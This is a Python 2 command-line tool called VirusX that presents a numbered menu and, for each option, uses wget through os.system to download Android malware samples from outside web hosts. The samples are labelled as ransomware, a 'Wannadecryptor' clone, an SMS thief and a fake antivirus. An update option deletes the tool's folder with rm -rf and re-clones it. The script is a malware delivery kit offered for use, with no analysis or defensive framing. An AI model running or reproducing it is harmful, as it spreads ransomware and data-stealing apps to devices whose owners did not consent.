#!/usr/bin/evn python

import sys
import os
import time
import os as sistema

# Set color
R = '\033[31m' # Red
N = '\033[1;37m' # White
G = '\033[32m' # Green
O = '\033[0;33m' # Orange
B = '\033[1;34m' #Blue
os.system("cd banner;python2 banner4.py")
print
print ("\033[49m                   Welcome To Virus-X                     \033[0m")
print ("\033[48m                   Author: Trilok Singh                   \033[0m")
print

os.system("cd banner;python2 table.py")

def help():
  print
  print ("\033[44m Developer : Trilok Singh Maitry\033[0m")
  print ("\033[44m Program : VirusX\033[0m")
  print ("\033[44m Based On Python\033[0m")
  print
  main()

def main():
  dr = raw_input(">>> ")
  if dr == "show options":
    time.sleep(1)
    help()
    main()
    
    ############
    ###VIRUS1###
    ###########
  elif dr == "00":
		android = raw_input(""+R+"Virus"+B+"X > ")
		if android == "run":
			time.sleep(1)
			print (""+G+"DroidXAntivirus")
			time.sleep(2)
			print
			print ""+B+"[*] "+N+"Downloading..."
			time.sleep(1)
			os.system("cd virus;mkdir Antivirus;cd Antivirus;wget https://github.com/ashishb/android-malware/raw/master/unclassified_apks/DroidXAntivirus.apk")
			print
			print "Now check folder Virus on "+R+"/VirusX/virus/Antivirus/"+N+""
			print ""+B+"[*]"+N+"Finished"
			print
			main()
  elif dr == "01":
		rez = raw_input(""+R+"Virus"+B+"X > ")
		if rez == "run":
			time.sleep(1)
			print (""+G+"Freeze")
			print ""+B+"[*]"+N+" Downloading virus..."
			os.system("cd virus;mkdir freeze;cd freeze;wget http://zumizec-com.waper.co/files/freeze.apk")
			print
			print "Now check folder virus on"+R+" /VirusX/virus/freeze/"
			time.sleep(1)
			print ""+B+"[*]"+N+"Finished"
			print
			main()
  elif dr == "02":
		dea = raw_input(""+R+"Virus"+B+"X > ")
		if dea == "run":
			time.sleep(1)
			print (""+G+"Ransomware")
			print ""+B+"[*]"+N+" Downloading virus..."
			os.system("cd virus;mkdir androidran;cd androidran;wget http://loolzec.blogwaper.com/files/androidransomware.zip")
			time.sleep(1)
			print
			print "Now check folder virus on "+R+"/VirusX/virus/androidran/"
			time.sleep(1)
			print ""+B+"[*]"+N+"Finished"
			print
			main()
  elif dr == "03":
		dea = raw_input(""+N+"VirusX > ")
		if dea == "run":
			time.sleep(1)
			print ""+B+"[*]"+N+" Downloading virus..."
			os.system("cd virus;mkdir malware;cd malware;wget http://loolzec.blogwaper.com/files/b.apk")
			time.sleep(1)
			print
			print "Now check folder virus on "+R+"/VirusX/virus/malware/"
			time.sleep(1)
			print ""+B+"[*]"+N+"Finished"
			print
			main()
  elif dr == "04":
		dea = raw_input(""+N+"Virus"+B+"X > ")
		if dea == "run":
			time.sleep(1)
			print ""+B+"[*]"+N+" Downloading virus..."
			os.system("cd virus;mkdir Wannadecryptor;cd Wannadecryptor;wget http://loolzec.blogwaper.com/files/wannadecryptor.apk")
			time.sleep(1)
			print
			print "Now check folder virus on "+R+"/VirusX/virus/Wannadecryptor/"
			time.sleep(1)
			print ""+B+"[*]"+N+"Finished"
			print
			main()
  elif dr == "05":
		dea = raw_input(""+N+"Virus"+B+"X > ")
		if dea == "run":
			time.sleep(1)
			print ""+B+"[*]"+N+" Downloading virus..."
			os.system("cd virus;mkdir Wannadecryptor2;cd Wannadecryptor2;wget http://loolzec.blogwaper.com/files/wannadecryptor.apk")
			time.sleep(1)
			print
			print "Now check folder virus on "+R+"/DarkXploit/virus/Wannadecryptor2/"
			time.sleep(1)
			print ""+B+"[*]"+N+" Job finished"
			print
			main()
  elif dr == "06":
		dea = raw_input(""+N+"Virus"+B+"X > ")
		if dea == "run":
			time.sleep(1)
			print ""+B+"[*]"+N+" Downloading virus..."
			os.system("cd virus;mkdir sms_tief;cd sms_tief;wget http://loolzec.blogwaper.com/files/smsthief.apk")
			time.sleep(1)
			print
			print "Now check folder virus on "+R+"/VirusX/virus/sms_tief/"
			time.sleep(1)
			print ""+B+"[*]"+N+"Finished"
			main()
  elif dr == "07":
		dea = raw_input(""+N+"Virus"+B+"X > ")
		if dea == "run":
			time.sleep(1)
			print ""+B+"[*]"+N+" Downloading virus..."
			os.system("cd virus;mkdir dangerous-malware;cd dangerous-malware;wget http://loolzec.blogwaper.com/files/y.apk")
			time.sleep(1)
			print
			print "Now check folder virus on "+R+"/VirusX/virus/dangerous-malware/"
			time.sleep(1)
			print ""+B+"[*]"+N+"Finished"
			print
			main()
  elif dr == "08":
		dea = raw_input(""+N+"Virus"+B+"X > ")
		if dea == "run":
			time.sleep(1)
			print ""+B+"[*]"+N+" Downloading virus..."
			os.system("cd virus;mkdir malware_enc;cd malware_enc;wget http://loolzec.blogwaper.com/files/30208552a677cce35d4863d3d85b85.apk")
			time.sleep(1)
			print
			print "Now check folder virus on "+R+"/VirusX/virus/malware_enc/"
			time.sleep(1)
			print ""+B+"[*]"+N+"Finished"
			print
			main()
  elif dr == "09":
		dea = raw_input(""+N+"Virus"+B+"X > ")
		if dea == "run":
			time.sleep(1)
			print ""+B+"[*]"+N+" Downloading virus..."
			os.system("cd virus;mkdir malware_bnews;cd malware_bnews;wget http://loolzec.blogwaper.com/files/benews.apk")
			time.sleep(1)
			print
			print "Now check folder virus on "+R+"/VirusX/virus/malware_bnews/"
			time.sleep(1)
			print ""+B+"[*]"+N+"Finished"
			print
			main()
  elif dr == "virusx update":
    print ""+G+"~ "+B+"UPDATING..."
    time.sleep(2)
    print ""+G+"Cloning repo..."
    time.sleep(6)
    os.system("cd ..;rm -rf VirusX;git clone https://github.com/TSMaitry/VirusX;cd VirusX;python2 VirusX.py")
    main()
  elif dr == "10":
    time.sleep(1)
    print ""+R+"exiting..."
    time.sleep(1)
    print "bye_bye"
    sys.exit()
  else:
    print ("Invalid Input : "),dr
    os.system("cd script;python2 esprint.py")
    print
    main()
if __name__ == "__main__":
	main()
  
